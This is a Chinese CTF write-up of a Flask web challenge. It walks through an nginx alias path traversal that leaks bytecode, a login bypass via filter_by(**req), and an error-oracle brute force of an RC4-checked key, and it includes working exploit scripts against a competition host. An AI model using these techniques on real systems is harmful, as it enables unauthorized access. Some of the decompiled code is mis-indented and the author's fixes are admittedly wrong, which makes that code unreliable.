# 网鼎杯2022总决赛-secret 全栈CTFer的自我修养(？)


## 碎碎念

​		本来没想着网鼎杯能进总决赛的，毕竟青龙组100+个队就给了12个晋级名额。结果 RHG 一开快手+强运+队友给力直接飞到前十躺进了总决赛，半决赛两个 pwn 防御也是水得不行，本想着逆向手进场观摩队友做题结果意外和 Photon 大哥合力把 pwn 基本 ak 了，只能说运气很好。

​		总决赛基本没有逆向手的题（共同防御那个java题出来的时候我精神状态不是很稳定，exp一直挂到了比赛结束），值得复盘的也就只有这个还挺有意思的web综合题了，我还是太菜了。

## 漏洞分析

​		题目镜像丢了，别问。

### 漏洞点1

​		登录进去是一个简单的登录框，试着打了两个单引号发现似乎没有 SQL 注入，Burp 一开先抓包再考虑别的。

​		突破口在 `Response Header`里的 `Server: Cpython3.5`，可以发现似乎是 python 的后端，应该是 Flask 框架， 试了一下没有模板注入的点，考虑`__pycache__`泄漏，整了半天也没访问到pycache文件夹。根据资源请求随便试了一下`/static`目录，发现可以访问。

​		理论上说 py 代码应该在static上级目录的某处，一通乱试发现`/static../`路径可以访问上级目录，目录结构如下：

```
| __pycache__
 	 | __init__.cpython-35.pyc
  	 | models.cpython-35.pyc
| main
 	 | __pycache__
  	 	| __init__.cpython-35.pyc
  	 	| forms.cpython-35.pyc
  	 	| views.cpython-35.pyc
  	| __init__.py
  	| forms.py
 	| views.py
| static
	| 不重要
| templates
	| 不重要
| __init__.py
| models.py
| nginx.conf
```

查看`nginx.conf`文件

```nginx
user www-data;
worker_processes auto;
pid /run/nginx.pid;

events {
	worker_connections 768;
	# multi_accept on;
}

http {

	##
	# Basic Settings
	##

	sendfile on;
	tcp_nopush on;
	tcp_nodelay on;
	keepalive_timeout 65;
	types_hash_max_size 2048;
	# server_tokens off;

	# server_names_hash_bucket_size 64;
	# server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	##
	# SSL Settings
	##

	ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
	ssl_prefer_server_ciphers on;

	##
	# Logging Settings
	##

	#access_log /var/log/nginx/access.log;
	#error_log /var/log/nginx/error.log;

	##
	# Gzip Settings
	##

	gzip on;
	gzip_disable "msie6";

	# gzip_vary on;
	# gzip_proxied any;
	# gzip_comp_level 6;
	# gzip_buffers 16 8k;
	# gzip_http_version 1.1;
	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

	limit_conn_zone $binary_remote_addr zone=conn:10m;
	limit_req_zone  $binary_remote_addr zone=allips:10m rate=2r/s;

	
	server {
	    listen 80 default_server;
	    server_name localhost;
		autoindex on;
	    location /static {
	        alias /secret/app/static/ ;
	    }
		
		location ~* \.(py)$ {
			deny all;
		}
		location ~* (cmdline|environ)$ {
			deny all;
		}

	    location / {
	        limit_conn conn 10;
	        proxy_pass       http://localhost:8000;
	        proxy_set_header Host $host:$server_port;
			proxy_redirect ~^http://127.0.0.1:8000(.*)   http://127.0.0.1$1;
			add_header Server Cpython3.5;
	    }
	}
	##
	# Virtual Host Configs
	##
}
```

发现py文件全都不能访问，漏洞应该是由`alias /secret/app/static/ ;`引起的。

考虑从pycache中dump pyc字节码进行逆向。

~~其实打到这一步已经试了一个多小时，我要是有哪怕一点web安全经验我会是这个鸟样子？~~

### 漏洞点2

核心逻辑在`views.py`，使用 uncompyle6 逆向结果如下：

```python
# views.py
from flask import render_template, redirect, request, url_for, flash, jsonify, current_app
from flask.ext.login import login_user, login_required, logout_user, current_user
from . import main
from werkzeug.security import generate_password_hash, check_password_hash
from .. import db
import string, random, os
from ..models import User, Post
import base64

@main.route('/login', methods=['GET'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('main.index'))
    return render_template('login.html')


@main.route('/logout', methods=['GET'])
@login_required
def logout():
    logout_user()
    return redirect(url_for('.login'))


@main.route('/', methods=['GET', 'POST'])
@login_required
def index():
    post = Post.query.filter_by(id=1).first()
    return render_template('index.html', flag=post.enc_text)


@main.route('/api/login/', methods=['POST'])
def apiLogin():
    req = request.get_json()
    if not req:
        return jsonify(result=False)
    try:
        user = User.query.filter_by(**req).first()
    except Exception as e:
        return jsonify(result=False)
    else:
        if not user:
            return jsonify(result=False)
    return jsonify(result=True)


@main.route('/api/check/', methods=['POST'])
def check():
    post = Post.query.filter_by(id=1).first()
    req = request.get_json()
    if not req:
        return jsonify(result=False)
    else:
        if req['key']:
            enc_key, key = str(base64.b64decode(post.enc_key), encoding='utf-8'), req['key']
            encoder = Encoder()
            if len(enc_key) != len(key):
                return jsonify(result=False)
            for x, y in zip(enc_key, key):
                if x != encoder.do_encrpt(y):
                    return jsonify(result=False)

                encoder = Encoder(enc_key)
                flag = ''
                for i in str(base64.b64decode(post.enc_text), encoding='utf-8'):
                    flag += encoder.do_encrpt(i)

                return jsonify(result=flag)
           return jsonify(result=False)


class Encoder:

    def __init__(self, crypt_key=None):
        if crypt_key is None:
            crypt_key = current_app.config['KEY']
        self.stream = self.randomBox(self._init_box(crypt_key))

    def do_encrpt(self, c):
        return chr(ord(c) ^ next(self.stream))

    def _init_box(self, crypt_key):
        """
        初始化 置换盒
        """
        Box = list(range(256))
        key_length = len(crypt_key)
        j = 0
        for i in range(256):
            index = ord(crypt_key[(i % key_length)])
            j = (j + Box[i] + index) % 256
            Box[i], Box[j] = Box[j], Box[i]

        return Box

    def randomBox(self, S):
        """
        加密/解密
        s : box
        """
        i = 0
        j = 0
        while True:
            i = i + 1 & 255
            j = j + S[i] & 255
            S[i], S[j] = S[j], S[i]
            yield S[(S[i] + S[j] & 255)]
# okay decompiling views.cpython-35.pyc
```

`model.py`也有一些用处

```python
# model.py
from . import db
from flask.ext.login import UserMixin
from . import login_manager
from werkzeug.security import generate_password_hash, check_password_hash
from flask import current_app

class User(UserMixin, db.Model):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, index=True)
    password = db.Column(db.String(128))

    def __repr__(self):
        return '<User %s>' % self.username


class Post(db.Model):
    __tablename__ = 'post'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer)
    enc_text = db.Column(db.Text)
    enc_key = db.Column(db.Text)

    def __repr__(self):
        print('<Post %s>' % self.id)


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))
```

漏洞在登录验证逻辑：

```python
@main.route('/api/login/', methods=['POST'])
def apiLogin():
    req = request.get_json()
    if not req:
        return jsonify(result=False)
    try:
        user = User.query.filter_by(**req).first()
    except Exception as e:
        return jsonify(result=False)
    else:
        if not user:
            return jsonify(result=False)
    return jsonify(result=True)
```

登录验证接受一个数据包，直接将数据包对应的字段在数据库中查询，若能查询到对应的`user`则返回登录成功。

正常发送数据包应该为：

```json
{
	"username":"admin",
	"password":"xxxxxx"
}
```

此时若密码错误则无法登录，密码是否为空仅在前端判断，构造 payload 如下：

```json
{
	"username":"admin"
}
```

无 password 字段，则可以在数据库中查询到对应的用户，成功绕过登录验证，登录成功。

但是并没有什么卵用，我们打不到`flag`。

### 漏洞点3

考虑打`flag check`的API。

```python
@main.route('/api/check/', methods=['POST'])
def check():
    post = Post.query.filter_by(id=1).first()
    req = request.get_json()
    if not req:
        return jsonify(result=False)
    else:
        if req['key']:
            enc_key, key = str(base64.b64decode(post.enc_key), encoding='utf-8'), req['key']
            encoder = Encoder()
            if len(enc_key) != len(key):
                return jsonify(result=False)
            for x, y in zip(enc_key, key):
                if x != encoder.do_encrpt(y):
                    return jsonify(result=False)

           	encoder = Encoder(enc_key)
            flag = ''
            for i in str(base64.b64decode(post.enc_text), encoding='utf-8'):
                flag += encoder.do_encrpt(i)

            return jsonify(result=flag)
     return jsonify(result=False)
```

`Encoder`类是一个简单的`RC4`，凭借我并不多的密码学知识我觉得这个`RC4`是非常安全的，攻击面应该不在这里。

大致的逻辑是传入`key`，使用`RC4`检验`key`，若等于在数据库中的密文则返回flag。

一开始考虑泄漏`enc_key`，但是我并没有能够泄漏这个东西的web水平，或者说这个东西应该是安全的。

考虑仔细分析一下这个代码。

```python
if len(enc_key) != len(key):
      return jsonify(result=False)
```

首先是长度check。`enc_key`应该是一个byte字符串，`key`由我们自己传入，而`python`的`len()`函数不止对字符串有效，我们也可以传入一个list。

```python
for x, y in zip(enc_key, key):
     if x != encoder.do_encrpt(y):
            return jsonify(result=False)
```

check逻辑。这个逻辑很奇怪，并不是把明文整个拿去加密，而是一个一个字符加密并比较，应该是需要`one-by-one`爆破。

这里看了很久也没有想到怎么爆破，甚至写了一个侧信道的脚本（怎么想都不可行）。后来在人肉fuzz的时候发现如果传入的`key`是一个int类型则会返回500内部错误。

这里的漏洞出在这里：

```python
def do_encrpt(self, c):
    return chr(ord(c) ^ next(self.stream))
```

数字没有ord()，在ord的时候会报错，这为我们提供了逐字节爆破的可能。

#### 爆破长度

首先考虑过`len(enc_key) == len(key)`的check。不难发现，若传入一个全数字的list，若长度错误则会返回`{result: False}`，若长度正确则会进入check逻辑，对key[0]也就是第一个数字进行加密，导致异常得到500状态码。

```python
import requests
import string
import json
url = "http://172.16.9.15:6081/api/check/"
header = {
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
	'Content-Type': 'application/json',
	'Origin': 'http://172.16.9.15:6081',
	'Referer': 'http://172.16.9.15:6081/login',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'zh-CN,zh;q=0.9'
}
data = {
	'key': []
}
for i in range(255):
	data['key'].append(1)
	resp = requests.post(url, headers = header, data = json.dumps(data))
	if resp.content[0] != 123:
		print(f"[+]length:", i+1)
		break
```

得到长度为30。

#### 爆破key

使用相同的逻辑，依次爆破key的每一位，并且在后续添加全数字，如果该位key正确则会继续加密后一位的数字导致500，否则返回`{result: False}`。

```python
import requests
import string
import json
url = "http://172.16.9.15:6081/api/check/"
header = {
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
	'Content-Type': 'application/json',
	'Origin': 'http://172.16.9.15:6081',
	'Referer': 'http://172.16.9.15:6081/login',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'zh-CN,zh;q=0.9'
}
data = {
	'key': []
}
for i in range(255):
	data['key'] = ['S', 'Q', 'D', '6', '8', 'u', 'i', 'y', 'o', '6', 'k', 'd', 'K', 'r', 'w', '9', 'm', 'd', '1', 'L', '3', 'n', 'J', '3', '1', 'E', 'x', '0', 'F']
    #这里我来不及调了，直接手动一个一个往里面放的
	j = len(data['key'])
	data['key'].append(chr(i))
	for i in range(30-j-1):
		data['key'].append(1)
	print(data['key'])
	resp = requests.post(url, headers = header, data = json.dumps(data))
	if resp.content[0] != 123:
		break
```

最终在该环节关闭的5分钟前解出了该题flag。~~我要是会web我会是这个鸟样子？~~

## 漏洞修复

这里修了上面发现的3个洞，但是应该修错了或是有剩下的洞没有发现，次数用完了也没有防御成功。仅提供修复思路作为参考。

### 漏洞点1

修改`nginx.conf`

```nginx
location /static {
	deny all ;
}
```

### 漏洞点2

这个地方修得很丑陋，应该是完全修错了

加入字段判断

```python
if req['id']:
	return jsonify(result=False)
if not req['username']:
	return jsonify(result=False)
if not req['password']:
	return jsonify(result=False)
```

### 漏洞点3

直接用`try:....except:...`框起来


